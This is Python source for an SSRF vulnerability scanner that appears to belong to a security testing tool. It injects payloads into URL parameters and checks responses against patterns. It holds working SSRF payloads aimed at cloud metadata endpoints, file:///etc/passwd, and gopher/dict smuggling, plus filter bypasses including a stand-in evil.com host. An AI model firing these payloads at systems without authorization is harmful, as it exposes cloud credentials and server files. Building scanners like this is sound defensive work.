# BRS-GPT: AI-Powered Cybersecurity Analysis Tool
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-10-03 01:41:52 MSK
# Status: Created
# Telegram: https://t.me/easyprotech

"""
SSRF (Server-Side Request Forgery) Scanner

Detects SSRF vulnerabilities through:
- Internal IP access attempts
- localhost variations
- Cloud metadata endpoints
- Protocol smuggling
- DNS rebinding indicators
"""

import asyncio
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime

from ..utils.http_client import HttpClient


class SSRFScanner:
    """Server-Side Request Forgery vulnerability scanner."""

    def __init__(self, http_client: HttpClient, settings: Dict[str, Any]):
        """
        Initialize SSRF scanner.
        
        Args:
            http_client: HTTP client for requests
            settings: Scanner settings
        """
        self.http_client = http_client
        self.settings = settings
        self.timeout = settings.get('request_timeout', 15)
        self.max_tests_per_param = settings.get('max_ssrf_tests', 15)

        # SSRF test payloads
        self.test_payloads = {
            'localhost': [
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://[::1]',
                'http://localhost:80',
                'http://127.0.0.1:80',
            ],
            'internal_ips': [
                'http://192.168.1.1',
                'http://10.0.0.1',
                'http://172.16.0.1',
                'http://169.254.169.254',  # AWS metadata
            ],
            'cloud_metadata': [
                'http://169.254.169.254/latest/meta-data/',  # AWS
                'http://metadata.google.internal/computeMetadata/v1/',  # GCP
                'http://169.254.169.254/metadata/instance',  # Azure
            ],
            'protocol_smuggling': [
                'file:///etc/passwd',
                'file:///c:/windows/win.ini',
                'gopher://127.0.0.1:25/',
                'dict://127.0.0.1:11211/',
            ],
            'bypasses': [
                'http://127.0.0.1.nip.io',
                'http://0x7f000001',  # Hex encoded 127.0.0.1
                'http://2130706433',  # Decimal encoded 127.0.0.1
                'http://localhost#@evil.com',
            ]
        }

        # Response indicators of successful SSRF
        self.ssrf_indicators = [
            r'root:.*:/bin/',  # /etc/passwd
            r'\[extensions\]',  # win.ini
            r'ami-id',  # AWS metadata
            r'instance-id',  # AWS/Azure metadata
            r'computeMetadata',  # GCP metadata
            r'PRIVATE-TOKEN',
            r'Authorization:',
        ]

    async def scan_target(self, target_url: str) -> List[Dict[str, Any]]:
        """
        Scan target for SSRF vulnerabilities.
        
        Args:
            target_url: Target URL to scan
            
        Returns:
            List of discovered SSRF vulnerabilities
        """
        vulnerabilities = []
        
        try:
            parsed_url = urlparse(target_url)
            query_params = parse_qs(parsed_url.query)
            
            if not query_params:
                return vulnerabilities

            # Test each parameter
            for param_name, param_values in query_params.items():
                param_vulns = await self._test_parameter(
                    target_url, param_name, param_values[0] if param_values else ''
                )
                vulnerabilities.extend(param_vulns)

        except Exception:
            pass

        return vulnerabilities

    async def _test_parameter(self, base_url: str, param_name: str, param_value: str) -> List[Dict[str, Any]]:
        """
        Test a specific parameter for SSRF.
        
        Args:
            base_url: Base URL
            param_name: Parameter name
            param_value: Original parameter value
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []

        # Test different SSRF payload categories
        for category, payloads in self.test_payloads.items():
            for payload in payloads[:self.max_tests_per_param]:
                vuln = await self._test_payload(base_url, param_name, payload, category)
                if vuln:
                    vulnerabilities.append(vuln)
                    break  # Found vulnerability in this category

        return vulnerabilities

    async def _test_payload(self, base_url: str, param_name: str, 
                           payload: str, category: str) -> Optional[Dict[str, Any]]:
        """
        Test a single SSRF payload.
        
        Args:
            base_url: Base URL
            param_name: Parameter name
            payload: SSRF payload to test
            category: Payload category
            
        Returns:
            Vulnerability information if found
        """
        try:
            test_url = self._inject_payload(base_url, param_name, payload)
            
            response = await asyncio.wait_for(
                self.http_client.get(test_url),
                timeout=self.timeout
            )
            
            if not response:
                return None

            body = await response.text()
            
            # Check for SSRF indicators
            for indicator in self.ssrf_indicators:
                if re.search(indicator, body, re.IGNORECASE | re.MULTILINE):
                    return {
                        'type': 'ssrf_vulnerability',
                        'severity': self._assess_severity(category, indicator),
                        'confidence': 0.85,
                        'url': base_url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': 'GET',
                        'category': category,
                        'evidence': self._extract_evidence(body, indicator),
                        'cwe': 'CWE-918',
                        'owasp': 'A10:2021 - Server-Side Request Forgery',
                        'impact': self._get_impact_description(category),
                        'timestamp': datetime.utcnow().isoformat(),
                        'remediation': {
                            'summary': 'Implement URL validation and whitelist allowed destinations',
                            'details': [
                                'Validate and sanitize all URL inputs',
                                'Use whitelist of allowed protocols and destinations',
                                'Implement network segmentation',
                                'Disable unnecessary URL schemas (file://, gopher://)',
                                'Use deny-by-default firewall rules',
                                'Monitor outbound requests from application servers'
                            ]
                        }
                    }

            # Check response characteristics
            if self._check_response_characteristics(response, body, category):
                return {
                    'type': 'ssrf_potential',
                    'severity': 'medium',
                    'confidence': 0.65,
                    'url': base_url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': 'GET',
                    'category': category,
                    'evidence': 'Suspicious response characteristics',
                    'cwe': 'CWE-918',
                    'owasp': 'A10:2021 - Server-Side Request Forgery',
                    'impact': 'Potential SSRF vulnerability',
                    'timestamp': datetime.utcnow().isoformat(),
                    'remediation': {
                        'summary': 'Further investigation required',
                        'details': [
                            'Manual verification recommended',
                            'Validate and sanitize URL inputs',
                            'Implement proper access controls'
                        ]
                    }
                }

        except asyncio.TimeoutError:
            # Timeout could indicate SSRF (server trying to reach unreachable host)
            if category in ['localhost', 'internal_ips']:
                return {
                    'type': 'ssrf_timeout',
                    'severity': 'low',
                    'confidence': 0.50,
                    'url': base_url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': 'GET',
                    'category': category,
                    'evidence': 'Request timeout (possible SSRF attempt)',
                    'cwe': 'CWE-918',
                    'owasp': 'A10:2021 - Server-Side Request Forgery',
                    'impact': 'Possible SSRF (timeout)',
                    'timestamp': datetime.utcnow().isoformat()
                }
        except Exception:
            pass

        return None

    def _inject_payload(self, base_url: str, param_name: str, payload: str) -> str:
        """Inject SSRF payload into URL parameter."""
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _check_response_characteristics(self, response: Any, body: str, category: str) -> bool:
        """Check response characteristics for SSRF indicators."""
        # Very long response time for internal IP
        if category == 'internal_ips' and len(body) > 0:
            return True
        
        # Status code indicates successful connection
        if response.status in [200, 301, 302, 401, 403]:
            if category in ['localhost', 'internal_ips', 'cloud_metadata']:
                return True
        
        return False

    def _assess_severity(self, category: str, indicator: str) -> str:
        """Assess vulnerability severity based on category and indicator."""
        if category == 'cloud_metadata':
            return 'critical'
        if 'passwd' in indicator or 'root:' in indicator:
            return 'critical'
        if category == 'protocol_smuggling':
            return 'high'
        if category == 'localhost':
            return 'high'
        return 'medium'

    def _get_impact_description(self, category: str) -> str:
        """Get impact description based on category."""
        impacts = {
            'localhost': 'Access to internal services and localhost endpoints',
            'internal_ips': 'Access to internal network resources',
            'cloud_metadata': 'Access to cloud metadata and credentials',
            'protocol_smuggling': 'Access to local files and internal services via protocol smuggling',
            'bypasses': 'Bypass of SSRF protections'
        }
        return impacts.get(category, 'Server-Side Request Forgery vulnerability')

    def _extract_evidence(self, body: str, pattern: str) -> str:
        """Extract SSRF evidence from response."""
        match = re.search(pattern, body, re.IGNORECASE | re.MULTILINE)
        if match:
            start = max(0, match.start() - 30)
            end = min(len(body), match.end() + 30)
            return body[start:end]
        return "SSRF indicator detected"


__all__ = ['SSRFScanner']

